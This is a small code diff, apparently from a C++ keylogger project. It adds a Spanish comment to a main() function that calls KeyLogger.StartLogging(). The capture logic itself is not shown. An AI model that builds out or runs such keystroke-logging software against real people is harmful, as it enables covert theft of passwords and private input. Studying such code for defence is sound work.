@@ -3,6 +3,6 @@
 Key KeyLogger;
 
 int main() {
-	KeyLogger.StartLogging();
+	KeyLogger.StartLogging();//iniciar lectura.
 	return 0;
 }
